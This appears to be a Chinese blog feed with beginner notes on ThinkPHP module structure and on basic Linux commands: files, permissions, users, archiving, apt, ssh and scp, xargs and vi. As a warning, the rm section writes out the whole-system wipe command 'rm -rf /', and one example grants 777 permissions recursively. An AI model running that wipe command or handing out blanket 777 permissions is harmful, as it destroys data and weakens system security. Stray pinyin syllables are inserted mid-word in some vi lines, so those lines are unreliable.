title="模块库类"></a>模块库类</h3><ul><li><p>命名空间</p><blockquote><p><strong>一个模块的命名空间均为app/模块名/..</strong>  </p><p><strong>即命名空间为文件所在的文件路径，期中第一个文件简写为app</strong></p></blockquote></li><li><p>模块和控制器隐藏</p><blockquote><p>由于默认是采用多模块的支持，所以多个模块的情况下必须在URL地址中标识当前模块，如果只有一个模块的话，可以在入口文件中进行模块绑定：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// [ 应用入口文件 ]</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 加载基础文件</span><span class="token keyword">require</span> <span class="token constant">__DIR__</span> <span class="token punctuation">.</span> <span class="token string">'/../thinkphp/base.php'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 执行应用并响应（绑定当前访问到index模块）</span>Container<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'app'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote></li><li><p>单一模块</p><blockquote><p>如果你的应用比较简单，只有唯一一个模块，那么可以进一步简化成使用单一模块结构，方法如下：</p><p><img src="image-20210505202549375.png" alt="image-20210505202549375"></p><p><img src="image-20210505202700156.png" alt="image-20210505202700156"></p></blockquote></li></ul><h3 id="空模块"><a href="#空模块" class="headerlink" title="空模块"></a>空模块</h3><blockquote><p><img src="image-20210505202839080.png" alt="image-20210505202839080"></p><p>即设置一个错误页面，使访问出错时自动跳转</p><p>config目录的app.php可以修改模块设置，其中空模块可以指定访问不存在的页面的返回内容</p></blockquote><p>​    </p><p>​    </p><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><blockquote><p><img src="image-20210430173005963.png" alt="image-20210430173005963"></p></blockquote><ul><li>所有模块命名空间均以app为根命名空间，网页模块均放置于application(文件夹下)</li><li>根命名空间可配置环境变量改变</li></ul><h3 id="模块绑定"><a href="#模块绑定" class="headerlink" title="模块绑定"></a>模块绑定</h3><blockquote><p>thinkphp位于public目录下的index.php可以改变默认的路径</p><p>使用get(‘app’)-&gt;bind(‘模块名’)-&gt;run()-&gt;send();</p><p>可以达成绑定的效果</p><p><img src="image-20210430201636195.png" alt="image-20210430201636195"></p><p><img src="image-20210430201702527.png" alt="image-20210430201702527"></p><p><img src="image-20210430201646233.png" alt="image-20210430201646233"></p></blockquote><h3 id="根命名空间（类库包）"><a href="#根命名空间（类库包）" class="headerlink" title="根命名空间（类库包）"></a><strong>根命名空间（类库包）</strong></h3><blockquote><p><img src="image-20210505203503005.png" alt="image-20210505203503005"></p></blockquote><blockquote><p><img src="image-20210505203520667.png" alt="image-20210505203520667"></p></blockquote><h3 id="应用类库包"><a href="#应用类库包" class="headerlink" title="应用类库包"></a>应用类库包</h3><blockquote><p><img src="image-20210505203925362.png" alt="image-20210505203925362"></p></blockquote><blockquote><p><img src="image-20210505204118156.png" alt="image-20210505204118156"></p></blockquote><h2 id="控制器定义"><a href="#控制器定义" class="headerlink" title="控制器定义"></a>控制器定义</h2><blockquote><p> <img src="image-20210430203506341.png" alt="image-20210430203506341"></p><p> <img src="image-20210430220102560.png" alt="image-20210430220102560"></p></blockquote><h3 id="控制器定义-1"><a href="#控制器定义-1" class="headerlink" title="控制器定义"></a>控制器定义</h3><blockquote><p><img src="image-20210505211220543.png" alt="image-20210505211220543"></p></blockquote><h2 id="基本查询"><a href="#基本查询" class="headerlink" title="基本查询"></a>基本查询</h2><blockquote><p><strong><img src="image-20210502110705844.png" alt="image-20210502110705844"></strong></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux学习笔记</title>
      <link href="/2020/11/06/linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/11/06/linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="linux基本命令学习笔记"><a href="#linux基本命令学习笔记" class="headerlink" title="linux基本命令学习笔记"></a>linux基本命令学习笔记</h1><h2 id="基本命令符的含义"><a href="#基本命令符的含义" class="headerlink" title="基本命令符的含义"></a>基本命令符的含义</h2><ul><li>终端符号含义解释<br><img src="2.png" alt="2"></li><li>mujie 用户名，表示现在进行操作的是mujie这个用户<br>ubuntu 主机名称，我现在示例的主机是ubuntu<br>“~“ 指示用户位置，表示家目录[home目录]<br>Desktop 指示用户位置，表示我现在处于桌面目录中   </li><li>路径的概念<br>绝对路径：从根目录开始到该目录的全部路径，例如：D:\CTF\boke\mybolg\hexoblog 就是到hexoblog的绝对路径<br>相对路径：指由这个文件所在的路径引起的跟其它文件（或文件夹）的路径关系，比如我现在如果处于mybolg文件夹中，那么hexoblog和boke两个<br>相邻路径都是相对与mybolg文件夹的相对路径。   </li><li>命令的格式  <img src="/2020/11/06/linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.png" class=""> cat是用于查看文件的命令，-b是选项，mu是文件夹名称<br>每个选项格式均为[-选项字母]看情况选择是否添加<br>选项可连续使用，如ls -alh  </li></ul><h3 id="linux学习须知"><a href="#linux学习须知" class="headerlink" title="linux学习须知"></a>linux学习须知</h3><ul><li><p>软件包的概念<br>linux系统的常用软件都储存在数据库中，下载时只是用命令从数据库中下载，所以非常方便。    </p></li><li><p>软件源<br>软件源是指下载软件的数据库，因为linux是国外的系统，所以如果按默认软件源，下载软件的速度会非常感人。所以有时需要将软件源设置到国内的镜像，以提升下载速度。 </p></li><li><p>Tab键<br>快速补齐命令，是linux系统操作是非常常用的按键。还可用于忘记命令时进行提示等操作，   </p></li></ul><h2 id="命令笔记"><a href="#命令笔记" class="headerlink" title="命令笔记"></a>命令笔记</h2><h3 id="文件的创建-amp-目录切换"><a href="#文件的创建-amp-目录切换" class="headerlink" title="文件的创建&amp;目录切换"></a>文件的创建&amp;目录切换</h3><h4 id="文件创建命令"><a href="#文件创建命令" class="headerlink" title="文件创建命令"></a>文件创建命令</h4><ul><li>touch<br>创建一个文件，例：touch 111.txt 意为创建一个名为111.txt的文件<br>同时创建多个同级文件，例 touch 111 112 113 114   </li></ul><ul><li><p>mkdir<br>创建一个文件夹，例：mkdir 111 意为创建一个名为111的文件夹<br>同时创建多个同级目录，例  mkdir 111 112 113 114   </p><p>-p选项<br> 同时创建多个递归目录，例 mkdir -p 111/112/113/114   </p></li></ul><h4 id="目录切换命令"><a href="#目录切换命令" class="headerlink" title="目录切换命令"></a>目录切换命令</h4><ul><li>cd<br>切换目录<br>cd .. 回到上一级目录<br>cd . 留在当前目录<br>cd /切换至根目录<br>cd -切换至上一次工作路径<br>cd [目录名] 切换到指定目录，<br>注：cd 命令相对路径只能一级一级切换，如同图形界面只能一个一个打开文件夹  <pre><code> cd命令绝对路径可以直接打开目标文件，无需一级一级切换。  </code></pre></li></ul><h3 id="查看文件-amp-文件复制与移动删除"><a href="#查看文件-amp-文件复制与移动删除" class="headerlink" title="查看文件&amp;文件复制与移动删除"></a>查看文件&amp;文件复制与移动删除</h3><h4 id="查看文件命令"><a href="#查看文件命令" class="headerlink" title="查看文件命令"></a>查看文件命令</h4><ul><li><p>ls 查看当前目录下的文件<br>-a选项，查看所有文件，包括隐藏文件。例<br><img src="1.png" alt="1"></p></li><li><p> 其中文件名前有点的为隐藏文件  </p></li><li><p>l选项，查看该目录下文件的详细信息<br>![4 - 副本](4 - 副本.png) </p></li><li><p>h选项，使查看到的内容更加人性化<br>这里直观的看到内存从一些看不懂的数字变为了看的懂的表示方法<br><img src="5.png" alt="5"></p></li></ul><ul><li>tree 以树状图的方式查看所在目录下的文件<br>需要运行命令下载，按终端提示即可  </li></ul><ul><li>cat 查看文件内容  </li><li>b选项，将查看到的内容输出行号，空行不输出<br><img src="6.png" alt="6"></li><li>如图3行和4行中间无行号  </li></ul><p>-n选项，输出所有行号，包括空行。<br><img src="7.png" alt="7">如图可见空行也输出了行号  </p><ul><li>more 查看文件内容<br>基本用法同cat类似，但如遇到内容极多的文件，cat命令直接显示至最底部，more从最开始按页显示。<br> <img src="8.png" alt="8"></li><li>按空格一次翻一页<br>按Enter向下 n 行，需要定义。默认为 1 行<br> 按Ctrl+B后退一页<br> 按Ctrl+F向前一页<br> 按q退出查看    </li><li>head 显示文件内容（默认十行）<br> 格式：head [-n 行数] 文件名<br> head同more一般，可以按页查看   </li><li>tail 显示文件后几行，以动态显示<br> -f选项，表示持续查看文件，直到按Ctrl+C结束     </li><li>grep 查看文件<br>不同于cat和more，grep后接字符可查找指定内容<br>如grep 11 mu 意为查看mu文件中所有包含11的行    </li><li>pwd 查看当前工作路径  </li></ul><h4 id="文件的复制-amp-移动-amp-删除"><a href="#文件的复制-amp-移动-amp-删除" class="headerlink" title="文件的复制&amp;移动&amp;删除"></a>文件的复制&amp;移动&amp;删除</h4><ul><li><p>cp 复制文件<br>格式为cp （需复制文件的位置）/[需复制文件的文件名] (复制后文件的位置)/ [复制后文件的文件名]<br>括号内内容可不选，仅用于从一个大目录到另一个大目录<br>如cp ./ mu ~/Desktop mi 意为将当前目录下的文件mu复制到桌面，并命名为mi（同一位置不能出现两个同名文件）<br>-i选项，出现重名文件询问是否覆盖<br><img src="9.png" alt="9"></p></li><li><p>mv 对文件重命名或移动文件<br> 在同一目录中操作，如mv mu mi意为将mu文件重命名为mi<br> 移动至其他文件夹夹，格式等同与cp命令但无需移动后文件名，如mv mu ./114意为将m文件mu移动至114文件夹  </p></li><li><p>rmdir 删除文件夹<br>rmdir命令只能删除文件夹，无法删除文件<br>与创建文件夹命令mkdir对应  </p></li><li><p>rm 删除文件<br>rm 后加文件名可删除文件，但无法删除文件夹  </p></li><li><p>r选项，删除文件夹和目录，如rm -r 114是删除114这个文件夹    </p></li><li><p>f强制删除   </p></li><li><p>rf选项，删除且不询问  </p></li><li><p>i选项，删除前逐一询问<br>注：rm -r命令需谨慎使用，一不小心就会成rm -rf / 删库  </p></li><li><p>clear 清空终端页面内容与缓存，超级常用的命令。  </p></li></ul><h3 id="用户权限及组管理"><a href="#用户权限及组管理" class="headerlink" title="用户权限及组管理"></a>用户权限及组管理</h3><h4 id="用户权限详解"><a href="#用户权限详解" class="headerlink" title="用户权限详解"></a>用户权限详解</h4><ul><li>ls -l 查看页面解释<br><img src="4.png" alt="4"><br>解释顺序从左到右<br>第一个d(-)说明文件类型，d为文件夹，-为文件<br>rwxrwxr-x 三位数为一组，从左到右依次为拥有者权限，组权限，其他人的权限<br>r 可读权限，常用数字4代替<br>w 可写权限，常用数字2代替<br>x 可执行权限，常用数字1代替  </li></ul><p>第一个mujie意为该目录的拥有者（创建者）为用户mujie，对应第一组权限<br>第二个mujie意为组名称为mujie，对应第二组权限  </p><h4 id="root权限的获取"><a href="#root权限的获取" class="headerlink" title="root权限的获取"></a>root权限的获取</h4><ul><li>获取命令<br>sudo passwd root 获取root权限并设置密码<br><img src="12.png" alt="12"><br>设置后用su（切换用户命令）即可进入root<br>设置后使用sudo可用root运行后续命令，但只能进入五分钟，超过五分钟需重新输入密码  </li></ul><h4 id="权限的修改"><a href="#权限的修改" class="headerlink" title="权限的修改"></a>权限的修改</h4><ul><li>chmod 修改文件权限<br>chmod后常跟权限选项<br>例：chmod +r 1 给所有用户1文件的可读权限<br>chmod -r 1 给所有用户取消对1文件的可读权限<br>r w x 用法均相同<br><img src="10.png" alt="10"></li><li>-指定权限修改<br>指定修改文件权限用数字表示<br>-R修改一个目录下所有文件权限<br>例：chmod -R 777 1<br>这里7表示权限所对应的数字和，此时为rwx（4+2+1=7）,其他同理<br><img src="11.png" alt="11"></li></ul><h4 id="创建组，删除组-amp-查看组，修改文件所属组"><a href="#创建组，删除组-amp-查看组，修改文件所属组" class="headerlink" title="创建组，删除组&amp;查看组，修改文件所属组"></a>创建组，删除组&amp;查看组，修改文件所属组</h4><h5 id="创建与删除组"><a href="#创建与删除组" class="headerlink" title="创建与删除组"></a>创建与删除组</h5><p>创建组与删除组均为group起头<br>创建组与删除组均需在root权限下运行或使用sudo命令   </p><ul><li>groupadd 创建组<br>例：sudo groupadd 1234 创建一个名为1234的组  </li><li>groupdel 删除组<br>例：sudo groupdel 1234 删除名为1234的组  <h5 id="查看组-amp-修改文件所属组"><a href="#查看组-amp-修改文件所属组" class="headerlink" title="查看组&amp;修改文件所属组"></a>查看组&amp;修改文件所属组</h5></li><li>查看组<br>首先须知，linux中，所有组的信息均储存在etc目录下的group文件中<br>故，无改动情况下，用任意文件查看命令均可查看<br>例：cat /etc/group<br><img src="13.png" alt="13"></li><li>修改文件所属组<br>chgrp<br>各式：chgrp [修改的目标组]  [修改的文件名]<br>例chgrp 12345 1<br><img src="14.png" alt="14">如图可见组名从原来的mujie变成了12345  </li></ul><h4 id="增加与删除用户"><a href="#增加与删除用户" class="headerlink" title="增加与删除用户"></a>增加与删除用户</h4><ul><li><p>useradd 增加用户<br>-m选项，自动生成该用户的家目录<br>-g选项，指定用户所在组，否则自动创建与增加用户同名的组<br>例：sudo useradd -mg zhangsan muyu<br> <img src="15.png" alt="15"></p></li><li><p><img src="16.png" alt="16">   </p></li><li><p>userdel 删除用户<br>-r选项，同时删除创建的家目录<br>例：sudo userdel -r muyu<br><img src="17.png" alt="17"></p></li><li><p>注：在linux中，用户数据保存在etc目录下的passwd文件中，查看用户只需要用任意查看命令查看即可<br>例：cat /etc/passwd   </p></li><li><p>passwd 添加用户的密码<br>格式：passwd [用户名]<br>一般每次创建用户后都需要设置密码<br>例：sudo passwd muyu<br><img src="18.png" alt="18">切换用户&amp;查看用户信息    </p></li><li><p>su 切换用户<br>只输入su时，默认切换至root用户（管理员用户）<br>su [用户名] 切换至目标目录，但不会切换至目标文件夹<br>su - 用户名 切换至目标用户的同时切换至目标用户的家目录文件夹<br><img src="19.png" alt="19"></p></li><li><p>who 查看当前登录的用户列表<br><img src="20.png" alt="20">如图，表示现在muyu用户只有mujie用户登录  </p></li><li><p>whoami 查看当前所在用户<br><img src="21.png" alt="21"><br>如图表示现在我处于muyu这个用户  </p></li><li><p>id 查看当前用户的id<br>id是用户的识别信息，分为UID和GID。如果说用户名是qq昵称，那id就是账号<br>UID 用户标识<br>GID 组标识  </p></li><li><p>exit 退出当前用户/返回上一个用户<br>使用exit可退出当前所在的用户<br>举个例子，我从mujie用户su进root用户，再从root用户进muyu用户，使用exit命令会使我从muyu用户退出到root用户，而不是退至mujie用户。再从root用户exit，才可退出至mujie用户。<br><img src="22.png" alt="22"></p></li></ul><h4 id="主组与附加组"><a href="#主组与附加组" class="headerlink" title="主组与附加组"></a>主组与附加组</h4><ul><li>概念<br>主组：创建用户时设定的组，一般不轻易修改<br>附加组：创建后添加的组，给主组用户提供附加组的权限，如sudo就是一个附加组，无sudo附加组的用户无法执行sudo命令。  </li><li>usermod 修改组  </li><li>G 修改附加组<br>格式：usermod -G [附加组名称]  [用户名称]<br>-g 修改主组<br>格式：usermod -g [目标主组] [用户名称]  </li><li>修改终端显示页面  </li><li>s 修改shell(终端显示界面)<br>格式：usermod -s [目标终端页面路径] [用户名]<br>例：usermod -s /bin/bash muyu<br>修改前<br><img src="23.png" alt="23"></li><li>修改后：  </li><li><img src="24.png" alt="24"></li><li></li><li>可以明显看到页面美化了一层<br>注：linux中有两中主要的终端界面，分别是dash和bash。一般linux创建用户默认为dash，因为系统觉得这样操作更方便，但dash页面不美观也不易辨识，在输入一些操作指令时会出现重大缺陷，所以有时需要我们根据需要手动修改。<br>而bash便是我们常用的终端界面，有颜色有位置标识。  </li><li>which 查看命令执行文件位置<br>往往在输入cat /etc/group 查看组位置时容易忘记如etc的目录，所有常需要一个命令查找。<br>例：which sudo<br><img src="25.png" alt="25"></li></ul><h3 id="打包压缩与软件安装"><a href="#打包压缩与软件安装" class="headerlink" title="打包压缩与软件安装"></a>打包压缩与软件安装</h3><h4 id="打包压缩"><a href="#打包压缩" class="headerlink" title="打包压缩"></a>打包压缩</h4><p>-tar 打包命令<br> 格式：tar -cvf [打包后文件名。tar] [要打包的文件]<br><img src="26.png" alt="26"> 注：打包不是压缩，打包文件名后要加.tar  </p><ul><li><p>tar 解包命令<br>格式：tar -xvf [需解包文件]<br><img src="27.png" alt="27"></p></li><li><p>c选项，生成档案文件，创建打包文件  </p></li><li><p>v选项，列出归档解档详细进程，显示进度。  </p></li><li><p>f选项，指定档案名称，f后解.tar，所以一定要放在最后。  </p></li><li><p>x选项，解开档案文件  </p></li><li><p>gzip压缩命令<br>格式：gzip [要压缩的tar文件]<br>例：gzip qwer.tar<br><img src="28.png" alt="28"></p></li><li><p>bzip2压缩命令<br>格式同gzip  </p></li><li><p>注：gzip和bzip2还有tar一般不单独使用，而是联合使用<br>gzip代表选项-z<br>bzip2代表选项-b<br>故常用的打包压缩命令为 tar -zcvf [压缩包名.tar.gz] [压缩文件名]<br>故常用的解压缩命令为 tar -zxvf [压缩包名.tar.gz]<br>bzip2同理  </p></li></ul><p>-C选项，指定压缩/解压位置<br><img src="29.png" alt="29"></p><h4 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h4><ul><li>apt install 安装命令<br>需在sudo下运行<br>格式：sudo apt install [软件包]<br><img src="30.png" alt="30"><br>sudo apt install htop 下载htop 效果是让top命令显示的界面更好看。<br><img src="31.png" alt="31"></li><li><img src="32.png" alt="32"></li></ul><ul><li>apt remove 卸载命令<br>须在sudo下运行<br>  格式：sudo apt remove [软件名]<br>  例：sudo apt remove sl 卸载sl软件  </li><li>apt upgrade 升级命令<br>须在sudo下运行<br>格式：sudo apt upgrade 自动检查升级并发出更新情求。<br><img src="33.png" alt="33"></li></ul><ul><li>设置软件源<br>设置方法按自己具体版本在百度找方法。  </li></ul><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><ul><li><p>date 查看当前时间  </p><ul><li>cal 查看日历<br>-y选项，查看一年的日历  </li></ul></li><li><p>df 显示磁盘剩余空间大小  </p></li><li><p>h使显示内容更人性化  </p></li><li><p>du 显示文件占用空间大小 </p></li><li><p>h使显示内容更人性化<br> 注：du命令后可接具体文件夹查看<br> <img src="34.png" alt="34"></p></li><li><p>ps 查看当前用户通过终端启动的 进程<br>aux选项，查看正在进行的全部进程，前面-可加可不加<br>a选项，查看所有进程，包括其他用户进程<br>u选项，查看进程详细状态<br>x选项，查看没有终端控制的进程  </p></li><li><p>top 动态显示系统所有进程并排序<br>按q或ctrl+c退出top查看页面，其中显示的页面第一行是进程代码，需要特别关注。  </p></li><li><p>kill 关闭/杀死进程   </p></li><li><p>9强制终止进程<br>格式：kill -9 [进程代码]   </p></li></ul><h3 id="远程管理"><a href="#远程管理" class="headerlink" title="远程管理"></a>远程管理</h3><ul><li><p>远程连接的准备工作  </p><ul><li>下载xshell，官网即可下载选学生用免费版即可。</li><li>ifconfig 查看ip地址，在win10主机中IP查看命令为ipconfig。<br><img src="35.png" alt="35"><br>如图，上方ens33对应的inet对应ip地址，用于和网络互通，下方lo对应inet为本机环回地址，用于检查本机网络连接状态。  </li><li>ping 测试网络连接量，常用来查看两台主机是否网络互通。<br>ping通是远程连接的前置条件。<br>用法：ping [IP地址/网址]<br><img src="36.png" alt="36"></li><li>route -n  查看linux系统网关  </li><li><img src="41.png" alt="41"></li><li>-n 不解析得到的数字<br>不加-n时，使用route命令得到的Destination（目的地址）是自动解析为英文的，而当使用-n后，目的地址不会被解析，仍以数字显示。<br><img src="42.png" alt="42"><br>没有使用-n选项，目的地址被解析。  </li></ul></li><li><p>ssh 远程连接命令<br>格式：ssh [用户名]@[ip地址]<br>连接成功后即可访问目标主机/服务器（用xshell连接）<br>-p选项，指定端口位置<br><img src="37.png" alt="37"></p></li></ul><p> <img src="38.png" alt="38"></p><ul><li>scp 远程复制<br>格式：scp [要复制的文件] [用户名]@[IP地址]：[远程复制后文件位置]<br>scp -P 22 [用户名]@[IP地址]:[要复制的文件地址] [复制后文件地址]<br>-r选项，可以选择传送文件夹<br>-P选项，可以指定端口位置<br>注：ssh命令默认端口为22，非22时需要用-P指定。 <ul><li>注：Win系统如果无法使用该命令，建议下载xftp进行远程文件复制，无论服务器还是主机都方便快捷。<br>也可以使用FileZilla进行文件传输，我推荐xftp是因为在官网下载xshell是会同时下载xftp。  </li><li>注意：上传任意文件至ubuntu时，都只能指定目录为tmp ,因为非管理员只对tmp目录有w（可写）权限</li></ul></li><li>ssh 高级  <ul><li>ssh信息都储存在.ssh文件中。  </li><li>免密登录  <ul><li>公钥配置shh-kengen 一路回车即可  </li><li>公钥上传到服务器<br>ssh-copy-id -p [端口号] [用户名]@[ip地址]  </li></ul></li></ul></li></ul><h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><ul><li><p>echo （显示指定文字）与&gt;/&gt;&gt;（重定向）<br>echo命令通常与重定向同用<br>linux允许将内存追加到文件中<br>‘&gt;’输出，将终端上的内容输出的文件中，会覆盖文件。<br>‘&gt;&gt;’追加，在文件后追加终端中输入的内容。<br>格式：echo [终端内容] &gt; [文件名] 或 echo [终端内容] &gt;&gt; [文件名]    </p></li><li><p>‘|’管道<br>管道是将两个命令同时执行的条件，命令符为“|”<br>例：cat -n mi | grep 2 将文件mi加行号查看，并选出含有2的行（包括行号）<br><img src="39.png" alt="39"></p></li><li><p>软连接与硬链接  </p><ul><li>ln 建立硬链接<br>-s选项，建立软连接<br>格式：ln -s [文件路径(绝对或相对)]<br>注：绝对比相对更稳定<br>软连接与硬链接概念<br><img src="40.png" alt="40"></li></ul></li><li><p>man 使用手册<br>格式：man [命令] 用于记得命令写法却忘记命令用途时，查看命令具体用处。    </p><ul><li>info 格式用途和man均相同，但info更加详细。  </li></ul></li></ul><h4 id="xargs命令"><a href="#xargs命令" class="headerlink" title="xargs命令"></a>xargs命令</h4><blockquote><p>xargs（英文全拼： eXtended ARGuments）是给命令传递参数的一个过滤器，也是组合多个命令的一个工具。</p><p>xargs 可以将管道或标准输入（stdin）数据转换成命令行参数，也能够从文件的输出中读取数据。</p><p>xargs 也可以将单行或多行文本输入转换为其他格式，例如多行变单行，单行变多行。</p><p>xargs 默认的命令是 echo，这意味着通过管道传递给 xargs 的输入将会包含换行和空白，不过通过 xargs 的处理，换行和空白将被空格取代。</p><p>xargs 是一个强有力的命令，它能够捕获一个命令的输出，然后传递给另外一个命令。</p><p><strong>之所以能用到这个命令，关键是由于很多命令不支持|管道来传递参数，而日常工作中有有这个必要，所以就有了 xargs 命令</strong></p><pre class="line-numbers language-linux"><code class="language-linux">find /sbin -perm +700 |ls -l       #这个命令是错误的find /sbin -perm +700 |xargs ls -l   #这样才是正确的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>xargs 一般是和管道一起使用。</strong></p><p>参数：</p><ul><li>-a file 从文件中读入作为 stdin</li><li>-e flag ，注意有的时候可能会是-E，flag必须是一个以空格分隔的标志，当xargs分析到含有flag这个标志的时候就停止。</li><li>-p 当每次执行一个argument的时候询问一次用户。</li><li>-n num 后面加次数，表示命令在执行的时候一次用的argument的个数，默认是用所有的。</li><li>-t 表示先打印命令，然后再执行。</li><li>-i 或者是-I，这得看linux支持了，将xargs的每项名称，一般是一行一行赋值给 {}，可以用 {} 代替。</li><li>-r no-run-if-empty 当xargs的输入为空的时候则停止xargs，不用再去执行了。</li><li>-s num 命令行的最大字符数，指的是 xargs 后面那个命令的最大命令行字符数。</li><li>-L num 从标准输入一次读取 num 行送给 command 命令。</li><li>-l 同 -L。</li><li>-d delim 分隔符，默认的xargs分隔符是回车，argument的分隔符是空格，这里修改的是xargs的分隔符。</li><li>-x exit的意思，主要是配合-s使用。。</li><li>-P 修改最大的进程数，默认是1，为0时候为as many as it can ，这个例子我没有想到，应该平时都用不到的吧</li></ul></blockquote><h4 id="vi命令"><a href="#vi命令" class="headerlink" title="vi命令"></a>vi命令</h4><pre><code>   vi的基本概念  </code></pre><p>　　基bai本上vi可分为三种操du作状态，分别是命令模式zhi(Command mode)、插入模dao式(Insert mode)和底线命令模式(Last line mode)，<br>　　各模式的功能区分如下：<br>　　1. Comand mode：控制屏幕光标的移动，字符或光标的删除，移动复制某区段及进入Insert mode下，或者到Last line mode。<br>　　2. Insert mode：唯有在Insert mode下，才可做文字数据输入，按Esc等可回到Comand mode。<br>　　3. Last line mode：将储存文件或离开编辑器，也可设置编辑环境，如寻找字符串、列出行号等。<br>　　不过可以把vi简化成两个模式，即是将Last line mode也算入Command mode,把vi分成Command 和Insert mode。<br>　　　　　　　　　　vi的基本操作<br>　　　　　　　　　　?进入vi<br>　　　　　　　　　　在系统提示符号输入vi及文件名称后，即可进入vi全屏幕编辑画面：<br>　　　　　　　　　　$ vi testfile<br>　　　　　　　　　　有一点要特别注意，就是您进入vi之后是处于“Command mode”下，您要切换到Insert mode才能输入文字。<br>　　　　　　　　　　初次用vi的用户都会想先用上下左右键移动光标，结果电脑一直叫，把自己气个半死，所以进入vi后，先不要乱动，<br>　　　　　　　　　　转换入Insert后再说。?切换至Insert mode编辑文件在Command mode下按‘i’、‘a’或‘o’三键就可进入Insert mode。<br>　　　　　　　　　　这时候您就可以开始输入文字了。<br>　　　　　　　　　　i: 插入，从目前光标所在之处插入所输入的文字。<br>　　　　　　　　　　a: 增加，目前光标所在的下一个字开始输入文字。<br>　　　　　　　　　　o: 插入新的一行，从行首开始输入文字。<br>　　　　　　　　　　?Insert的切换→Command mode，按Esc键<br>　　　　　　　　　　您目前处于Insert mode，您就只能一直打字。假如您发现打错字了，想用光标键往回移动，将该字删除，<br>　　　　　　　　　　就要按ESC键转换回Command mode，再删除文字。<br>　　　　　　　　　　?离开vi及存文件<br>　　　　　　　　　　在Command mode下，可按冒号“：”键入入Last line mode，例如：<br>　　　　　　　　　　:w filename (输入“w filename”，将文章存入指定的文件名filename)<br>　　　　　　　　　　:wq (输入“wq”，因为进入之时已经指定文件名testfile，所以会写入testfile并离开vi)<br>　　　　　　　　　　:q! (输入“q!”，强制离开并放弃编辑的文件)<br>　　　　　　　　　　Command mode功能键列表<br>　　　　　　　　　　在介绍command mode指令的时后，指令后面加上“常用”字眼的功能键，表示比较常用的vi指令，<br>　　　　　　　　　　请读者您一定要学会、记住。<br>　　　　　　　　　　(1)I、a、o切换进入Insert mode。[超级常用]<br>　　　　　　　　　　(2)移动光标<br>　　　　　　　　　　vi可以直接用键盘上的光标键来上下左右移动，但正规的vi是用小写英文字母h、j、 k、l，分别控制光标左、下、上、右移一格。<br>　　　　　　　　　　按Ctrl+B：屏幕往后移动一页。[常用]<br>　　　　　　　　　　按Ctrl+F：屏幕往前移动一页。[常用]<br>　　　　　　　　　　按Ctrl+U：屏幕往后移动半页。<br>　　　　　　　　　　按Ctrl+D：屏幕往前移动半页。<br>　　　　　　　　　　按 0 (数字零)：移动文章的开头。[常用]<br>　　　　　　　　　　按 G：移动到文章的最后。[常用]<br>　　　　　　　　　　按 w：光标跳到下个word的开头。[常用]<br>　　　　　　　　　　按 e：光标跳到下个word的字尾。<br>　　　　　　　　　　按 b：光标回到上个word的开头。<br>　　　　　　　　　　按 $：移到光标所在行的行尾。[常用]<br>　　　　　　　　　　按 ^：移到该行第一个非空白的字符。<br>　　　　　　　　　　按 0：移到该行的开头位置。[常用]<br>　　　　　　　　　　按 #：移到该行的第#个位置，例：51、121。[常用]<br>　　　　　　　　　　(3)删除文字<br>　　　　　　　　　　x：每按一次删除光标所在位置的后面一个字符。[超常用]<br>　　　　　　　　　　#x：例如，6x 表删除光标所在位置的后面6个字符。[常用]<br>　　　　　　　　　　X：大字的X，每按一次删除光标所在位置的前面一个字符。<br>　　　　　　　　　　#X：例如，20X 表删除光标所在位置的前面20个字符。<br>　　　　　　　　　　dd：删除光标所在行。[超常用]<br>　　　　　　　　　　#dd：例如，6dd表删除从光标所在的该行往下数6行之文字。[常用]<br>　　　　　　　　　　(4)复制<br>　　　　　　　　　　yw：将光标所在处到字尾的字符复制到缓冲区中。<br>　　　　　　　　　　(想在和#x、#X的功能相反)<br>　　　　　　　　　　p：将缓冲区内的字符粘贴到光标所在位置(指令‘yw’与‘p必须搭配使用)。<br>　　　　　　　　　　yy：复制光标所在行。[超常用]<br>　　　　　　　　　　p：复制单行到您想粘贴之处。(指令‘yy’与‘p’必须搭配使用)<br>　　　　　　　　　　#yy：如：6yy表示拷贝从光标所在的该行往下数6行之文字。[常用]<br>　　　　　　　　　　p:复制多行到您想粘贴之处。(指令‘#yy’与‘p’必须搭配使用)<br>　　　　　　　　　　“ayy：将复制行放入buffer a, vi提供buffer功能，可将常用的数据存在buffer<br>　　　　　　　　　　“ap：将放在buffer a的数据粘贴。<br>　　　　　　　　　　“b3yy：将三行数据存入buffer b。<br>　　　　　　　　　　“b3p：将存在buffer b的资料粘贴<br>　　　　　　　　　　(5)取代<br>　　　　　　　　　　r: 取代光标所在处的字符：[常用]<br>　　　　　　　　　　R：取代字符直到按Esc为止。<br>　　　　　　　　　　(6)复原(undo)上一个指令<br>　　　　　　　　　　u：假如您误操作一个指令，可以马上按u，回复到上一个操作。[超常用]<br>　　　　　　　　　　.: 